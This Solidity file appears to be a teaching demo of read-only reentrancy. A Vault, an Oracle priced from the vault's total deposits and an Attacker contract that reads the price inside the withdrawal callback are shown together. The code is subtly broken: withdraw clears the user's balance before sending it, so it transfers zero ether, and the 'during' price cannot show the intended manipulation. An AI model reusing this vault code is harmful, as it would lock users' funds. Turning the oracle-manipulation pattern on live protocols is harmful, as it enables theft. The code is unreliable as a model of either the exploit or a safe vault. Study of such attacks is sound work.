// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {ReentrancyGuard} from "./ReentrancyGuard.sol";

contract Vault is ReentrancyGuard {
    mapping(address user => uint256 lockedAmount) public userLocked;
    uint256 public totalLocked;

    function deposit() external payable {
        userLocked[msg.sender] += msg.value;
        totalLocked += msg.value;
    }

    function withdraw() external noReentrancy {
        require(userLocked[msg.sender] > 0, "no funds locked");
        require(address(this).balance >= userLocked[msg.sender], "not enough funds in vault");

        totalLocked -= userLocked[msg.sender];
        userLocked[msg.sender] = 0;

        (bool success,) = msg.sender.call{value: userLocked[msg.sender]}("");

        require(success, "can't send funds");
    }
}

contract Oracle {
    Vault private vault;

    constructor(address _vault) {
        vault = Vault(_vault);
    }
    // 5 / 2 = 2
    // (5 + 9) / 2 = 7
    function getPrice() public view returns (uint256) {
        return (vault.totalLocked() / 1 ether) / 2;
    }
}

contract Attacker {
    Vault private vault;
    Oracle private oracle;

    uint256 public priceBefore;
    uint256 public priceAfter;
    uint256 public priceDuring;
    uint256 public constant DEPOSIT_AMOUNT = 9 ether;

    constructor(address _vaultAddress, address _oracleAddress) {
        vault = Vault(_vaultAddress);
        oracle = Oracle(_oracleAddress);
    }

    function attack() public payable {
        priceBefore = oracle.getPrice();

        vault.deposit{value: DEPOSIT_AMOUNT}();

        vault.withdraw();

        priceAfter = oracle.getPrice();
    }

    receive() external payable {
        // ...
        priceDuring = oracle.getPrice();
    }
}